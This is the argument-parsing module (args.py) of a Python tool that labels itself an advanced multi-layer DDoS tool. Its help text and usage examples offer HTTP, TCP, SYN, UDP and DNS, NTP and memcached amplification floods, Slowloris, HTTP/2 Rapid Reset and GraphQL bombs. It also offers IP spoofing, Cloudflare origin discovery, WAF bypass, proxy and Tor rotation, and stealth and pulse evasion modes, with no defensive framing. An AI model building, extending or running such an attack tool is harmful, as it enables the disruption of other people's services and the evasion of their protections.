# args.py
import argparse
from utils import parse_data_size

def validate_data_size(value):
    size = parse_data_size(value)
    if size < 0:
        raise argparse.ArgumentTypeError("Invalid data size: use 1024, 64k, 1m")
    return size

def parse_args():
    parser = argparse.ArgumentParser(
        description="DiamondEye v10.0 — Advanced Multi-Layer DDoS Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Layer7 Attack:  python main.py http://target.com --workers 100 --flood
  Layer4 Attack:  python main.py http://target.com --attack-type tcp --target-port 80
  DNS Amplification: python main.py --attack-type dns --target-ip 1.2.3.4
  Adaptive Mode:  python main.py http://target.com --adaptive --max-rps 5000
  Reconnaissance: python main.py target.com --recon
  Plugin System:  python main.py --list-plugins
  Plugin Execution: python main.py http://target.com --plugin Slowloris
        """
    )
    
    # Основные параметры
    parser.add_argument('url', nargs='?', help='Target URL (e.g. http://127.0.0.1)')
    
    # Тип атаки и цели
    attack_group = parser.add_argument_group('Attack Configuration')
    attack_group.add_argument('--attack-type', 
                             choices=['http', 'tcp', 'udp', 'syn', 'dns', 'ntp', 
                                     'memcached', 'minecraft', 'slowloris', 'amplification'],
                             default='http', help='Type of attack (default: http)')
    attack_group.add_argument('--target-ip', help='Target IP for Layer4/Amplification attacks')
    attack_group.add_argument('--target-port', type=int, default=80, 
                             help='Target port for Layer4 attacks (default: 80)')
    parser.add_argument('--amplification', action='store_true',
                       help='Enable amplification mode for DNS/NTP')
    parser.add_argument('--duration', type=int, default=0,
                       help='Attack duration in seconds (0 = unlimited)')
    
    # Layer7 параметры
    layer7_group = parser.add_argument_group('Layer7 (HTTP) Options')
    layer7_group.add_argument('--scan', action='store_true', help='Enable path scanning mode')
    layer7_group.add_argument('--wordlist', help='Custom wordlist file')
    layer7_group.add_argument('-t', '--threads', type=int, default=20, help='Scan threads (default: 20)')
    layer7_group.add_argument('-o', '--output', default="found.txt", help='Save found paths')
    
    layer7_group.add_argument('-w', '--workers', type=int, default=10, help='Number of worker tasks')
    layer7_group.add_argument('-s', '--sockets', type=int, default=100, help='Connections per worker')
    layer7_group.add_argument('-m', '--methods', help='GET,POST,PUT,PATCH,ALL')
    layer7_group.add_argument('-u', '--useragents', help='User-Agent file')
    layer7_group.add_argument('-n', '--no-ssl-check', action='store_true')
    layer7_group.add_argument('-d', '--debug', action='store_true')
    layer7_group.add_argument('-l', '--log', help='Save text report')
    layer7_group.add_argument('--json', help='Save JSON report')
    layer7_group.add_argument('--plot', help='Save RPS plot')
    
    # Флаги атаки Layer7
    layer7_group.add_argument('--proxy', help='HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)')
    layer7_group.add_argument('--proxy-file', help='File with proxy list (one per line)')
    layer7_group.add_argument('--proxy-auto', action='store_true', 
                             help='Auto-fetch and rotate proxies')
    layer7_group.add_argument('--proxy-timeout', type=float, default=5.0,
                             help='Proxy check timeout in seconds')
    layer7_group.add_argument('--tor', action='store_true', help='Use TOR network')
    layer7_group.add_argument('--http3', action='store_true', help='Use HTTP/3 (QUIC)')
    parser.add_argument('--websocket', action='store_true', help='WebSocket flood mode')
    parser.add_argument('--auth', help='Authorization token: Bearer <token>')
    parser.add_argument('--h2reset', action='store_true', help='Enable HTTP/2 Rapid Reset')
    parser.add_argument('--http2', action='store_true', help='Use HTTP/2')
    parser.add_argument('--junk', action='store_true', help='Add random X-* headers')
    parser.add_argument('--random-host', action='store_true', help='Random subdomain in Host')
    parser.add_argument('--slow', type=float, default=0.0, help='Fraction of slow requests')
    parser.add_argument('--extreme', action='store_true', help='New TCP connection per request')
    parser.add_argument('--data-size', type=validate_data_size, default=0, help='Body size')
    parser.add_argument('--flood', action='store_true', help='Minimal delay → max RPS')
    parser.add_argument('--path-fuzz', action='store_true', help='Random deep paths')
    parser.add_argument('--header-flood', action='store_true', help='Up to 20 junk headers')
    parser.add_argument('--graphql-bomb', action='store_true', help='Send GraphQL batch bomb')
    parser.add_argument('--adaptive', action='store_true', help='Adaptive RPS')
    parser.add_argument('--method-fuzz', action='store_true', help='Use PROPFIND, REPORT, LOCK')
    parser.add_argument('--max-rps', type=int, default=0, help='Maximum RPS limit (0 = unlimited)')
    parser.add_argument('--max-bandwidth', type=int, default=0,
                       help='Maximum bandwidth in MB/s (0 = unlimited)')
    
    # Обход защиты
    bypass_group = parser.add_argument_group('Bypass & Evasion')
    bypass_group.add_argument('--bypass-technique', choices=['cloudflare', 'ovh', 'waf', 'auto'],
                             default='auto', help='WAF bypass technique')
    bypass_group.add_argument('--cf-real-ip', action='store_true',
                             help='Try to find real Cloudflare IP')
    bypass_group.add_argument('--rotate-ua', action='store_true',
                             help='Rotate User-Agents automatically')
    bypass_group.add_argument('--spoof-ip', action='store_true',
                             help='Spoof source IP (for Layer4)')
    
    # Мониторинг и отчетность
    monitor_group = parser.add_argument_group('Monitoring & Reporting')
    monitor_group.add_argument('--monitor-interval', type=float, default=1.0,
                             help='Stats update interval in seconds')
    monitor_group.add_argument('--save-stats', action='store_true',
                             help='Save detailed statistics to file')
    monitor_group.add_argument('--resource-alert', type=int, default=90,
                             help='CPU/RAM usage alert threshold (percentage)')
    
    # Система плагинов
    plugin_group = parser.add_argument_group('Plugin System')
    plugin_group.add_argument('--plugin', help='Execute specific plugin by name')
    plugin_group.add_argument('--list-plugins', action='store_true',
                             help='List all available plugins')
    plugin_group.add_argument('--plugin-config', help='Plugin configuration file (JSON)')
    
    # Система разведки
    recon_group = parser.add_argument_group('Reconnaissance')
    recon_group.add_argument('--recon', action='store_true',
                            help='Perform reconnaissance on target')
    recon_group.add_argument('--recon-full', action='store_true',
                            help='Full reconnaissance with vulnerability scanning')
    recon_group.add_argument('--recon-ports', type=str, default='21-25,53,80,443,3306,3389,8080',
                            help='Ports to scan (comma-separated or range)')
    recon_group.add_argument('--recon-save', help='Save reconnaissance report to file')
    
    # Расширенные опции
    advanced_group = parser.add_argument_group('Advanced Options')
    advanced_group.add_argument('--packet-size', type=int, default=1024,
                              help='Packet size for Layer4 attacks (bytes)')
    advanced_group.add_argument('--packet-count', type=int, default=0,
                              help='Number of packets to send (0 = unlimited)')
    advanced_group.add_argument('--source-port', type=int, default=0,
                              help='Custom source port (0 = random)')
    advanced_group.add_argument('--interface', help='Network interface to use')
    advanced_group.add_argument('--ttl', type=int, default=64,
                              help='IP TTL value for packets')
    
    # Экспериментальные функции
    experimental_group = parser.add_argument_group('Experimental')
    experimental_group.add_argument('--ai-mode', action='store_true',
                                  help='Use AI to optimize attack parameters')
    experimental_group.add_argument('--stealth', action='store_true',
                                  help='Enable stealth mode (slower, less detectable)')
    experimental_group.add_argument('--pulse', action='store_true',
                                  help='Pulse mode: alternating high/low intensity')
    
    return parser.parse_args()